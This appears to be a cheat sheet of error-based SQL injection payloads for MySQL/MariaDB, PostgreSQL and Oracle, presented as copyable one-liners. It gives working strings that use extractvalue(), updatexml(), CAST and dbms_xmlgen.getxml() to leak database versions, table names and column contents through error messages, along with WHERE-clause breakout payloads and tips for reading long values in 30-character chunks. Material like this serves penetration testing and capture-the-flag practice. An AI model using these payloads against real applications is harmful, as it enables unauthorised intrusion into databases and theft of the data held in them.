MySQL / MariaDB MySQL ▼
⚠ MySQL's CAST() returns null instead of erroring. Use extractvalue() or updatexml() instead.
ExtractValue() method
Version — invalid XPath triggers the error
extractvalue(1,concat(0x7e,version()))copy
Database name
extractvalue(1,concat(0x7e,database()))copy
First table
extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))copy
Second table (increment LIMIT offset)
extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)))copy
UpdateXML() method
Alternative to ExtractValue
updatexml(1,concat(0x7e,(SELECT version())),1)copy
Table name via UpdateXML
updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)),1)copy
Extract data
Dump column value
extractvalue(1,concat(0x7e,(SELECT col FROM target_table LIMIT 0,1)))copy
Long values — extract in 30-char chunks
extractvalue(1,concat(0x7e,substring((SELECT col FROM target_table LIMIT 0,1),1,30)))copy
WHERE clause injection
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))--copy
0x7e = ~ delimiter. Avoid starting the XPath with / . @ or a fully alphanumeric string — those are valid XPath and won't error.

CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 1) AS int)copy

CAST((SELECT col FROM target_table LIMIT 1) AS int)copy

' OR 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int)--copy
Key difference from MSSQL: use version() not @@version, and paginate with LIMIT 1 OFFSET n instead of TOP 1 ... NOT IN.
Oracle DB Oracle ▼
⚠ Oracle uses dbms_xmlgen.getxml() with an invalid column name to trigger errors. Column names are limited to 30 chars — always use substr().
Core technique
Version via dbms_xmlgen — invalid column name triggers error
to_char(dbms_xmlgen.getxml('select "'||substr((SELECT banner FROM v$version WHERE rownum=1),1,30)||'" from sys.dual'))copy
Get DB info
Current user
to_char(dbms_xmlgen.getxml('select "'||user||'" from sys.dual'))copy
Enumerate tables
First table
to_char(dbms_xmlgen.getxml('select "'||(SELECT table_name FROM all_tables WHERE rownum=1)||'" from sys.dual'))copy
Paginate via NOT IN
to_char(dbms_xmlgen.getxml('select "'||(SELECT table_name FROM all_tables WHERE table_name NOT IN ('KNOWN_TABLE') AND rownum=1)||'" from sys.dual'))copy
Extract data
Dump value — substr keeps under 30-char limit
to_char(dbms_xmlgen.getxml('select "'||substr((SELECT col FROM target_table WHERE rownum=1),1,30)||'" from sys.dual'))copy
Next 30 chars
to_char(dbms_xmlgen.getxml('select "'||substr((SELECT col FROM target_table WHERE rownum=1),31,30)||'" from sys.dual'))copy
Use || for string concat (not + or concat()). Always wrap inner query values in substr(,1,30) — Oracle enforces a 30-char column name limit.
